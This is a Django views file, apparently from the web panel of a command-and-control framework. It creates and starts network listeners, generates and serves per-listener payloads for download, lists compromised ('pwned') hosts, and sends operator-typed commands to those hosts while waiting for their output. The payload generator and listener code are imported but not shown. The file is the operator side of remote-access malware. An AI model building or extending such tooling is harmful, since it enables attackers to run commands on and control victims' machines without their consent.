from django.contrib import messages
from django.contrib.auth.decorators import login_required
from django.http import Http404, HttpResponseRedirect
from django.shortcuts import render, get_object_or_404, redirect
import generate_payload
from .models import Listener, pwnedHost
from .forms import ListenerForm
from django.views.decorators.cache import never_cache
from django.views.decorators.clickjacking import *
from django.http import HttpResponse
from django.views.decorators.csrf import csrf_exempt
from c2 import *
import threading
import time
from multiprocessing import Process

lock = threading.Lock()

@xframe_options_deny
@never_cache
@login_required
def listener_list(request):
    listeners = Listener.objects.filter()
    return render(request, 'listener_list.html', {'listeners': listeners})


@xframe_options_deny
@never_cache
@login_required
def listener_detail(request, pk):
    try:
        listener = get_object_or_404(Listener, pk=pk)
    except:
        raise Http404

    return render(request, 'listener_detail.html', {'listener': listener})


@xframe_options_deny
@never_cache
@login_required
def listener_new(request):
    if request.method == "POST":
        form = ListenerForm(request.POST)
        if form.is_valid():
            listener = form.save(commit=False)
            listener.author = request.user
            listener.title = form.cleaned_data['title']
            listener.interface = form.cleaned_data['interface']
            listener.port = form.cleaned_data['port']
            listener.save()
            return redirect('listener_detail', pk=listener.pk)
    else:
        form = ListenerForm()
    return render(request, 'listener_edit.html', {'form': form})


@xframe_options_deny
@never_cache
@login_required
def listener_replay(request, pk):
    try:
        listener = get_object_or_404(Listener, pk=pk)
    except:
        raise Http404
    t = threading.Thread(target=run, args=[listener.author, listener.interface, listener.port, listener.aes_encryption_key])
    t.daemon = True
    t.start()

    # run()
    # create_socket(listener.author, listener.interface, listener.port, listener.aes_encryption_key)
    # sock_connect()
    listeners = Listener.objects.filter()
    return render(request, 'listener_list.html', {'listeners': listeners})


@xframe_options_deny
@never_cache
@login_required
def listener_edit(request, pk):
    try:
        listener = get_object_or_404(Listener, pk=pk)
    except:
        raise Http404

    if listener.author != request.user:
        response = HttpResponse("You do not have permission to edit this listener")
        response.status_code = 403
        return response

    if request.method == "POST":
        form = ListenerForm(request.POST, instance=listener)
        if form.is_valid():
            listener = form.save(commit=False)
            listener.title = form.cleaned_data['title']
            listener.interface = form.cleaned_data['interface']
            listener.port = form.cleaned_data['port']
            listener.save()
            listeners = Listener.objects.filter()
            return render(request, 'listener_list.html', {'listeners': listeners})
    else:
        form = ListenerForm(instance=listener)
    return render(request, 'listener_edit.html', {'form': form})


@xframe_options_deny
@never_cache
@login_required
def payload_create(request, pk):
    try:
        listener = get_object_or_404(Listener, pk=pk)
    except:
        raise Http404
    generate_payload.gen_payload(listener.id, listener.port, listener.aes_encryption_key)
    listeners = Listener.objects.filter()
    return render(request, 'listener_list.html', {'listeners': listeners})


@xframe_options_deny
@never_cache
@login_required
def payload_download(request, pk):
    listener = get_object_or_404(Listener, pk=pk)
    return HttpResponseRedirect('static/payloads/listener-%d' % listener.id)


@xframe_options_deny
@never_cache
@login_required
def listener_delete(request, pk):
    try:
        listener = get_object_or_404(Listener, pk=pk)
    except:
        raise Http404

    # print(request.user.is_authenticated())

    if request.method == "POST":
        if listener.author != request.user:
            response = HttpResponse("You do not have permission to edit this listener")
            response.status_code = 403
            return response

        if request.user.is_authenticated:
            Listener.objects.filter(id=listener.pk).delete()
            messages.info(request, "The listener has been deleted")
        return redirect("/")

    return render(request, 'confirm_listener_delete.html', {'listener': listener})


@xframe_options_deny
@never_cache
@login_required
def terminal(request):
    pwnedhosts = pwnedHost.objects.filter()
    return render(request, 'term.html', {'pwnedhosts': pwnedhosts})


@xframe_options_deny
@never_cache
@login_required
@csrf_exempt
def result(request, pk):
    try:
        pwnedhost = get_object_or_404(pwnedHost, pk=pk)
    except:
        raise Http404

    param = request.POST.get('command')
    pwnedhost.cmd = param
    pwnedhost.save()
    while 1:
        host = get_object_or_404(pwnedHost, pk=pk)
        if host.result:
            data = host.result
            host.result = ""
            host.save()
            return HttpResponse(data)
            break


"""
@login_required
def get_result(request, pk):
    try:
        global host
        host = get_object_or_404(pwnedHost, pk=pk)
    except:
        raise Http404
    
"""

@xframe_options_deny
@never_cache
@login_required
def host(request, pk):
    pwnedhosts = pwnedHost.objects.filter()
    try:
        pwnedhost = get_object_or_404(pwnedHost, pk=pk)
    except:
        raise Http404
    return render(request, 'host.html', {'pwnedhosts': pwnedhosts, 'pwnedhost': pwnedhost})


@xframe_options_deny
@never_cache
@login_required
def host_delete(request, pk):
    try:
        pwnedhost = get_object_or_404(pwnedHost, pk=pk)
    except:
        raise Http404

    if request.method == "POST":
        if pwnedhost.author != request.user:
            response = HttpResponse("You do not have permission to edit this host")
            response.status_code = 403
            return response

        if request.user.is_authenticated:
            pwnedHost.objects.filter(id=pwnedhost.pk).delete()
            messages.info(request, "The host has been deleted")
        return redirect("/")

    return render(request, 'confirm_host_delete.html', {'pwnedhost': pwnedhost})
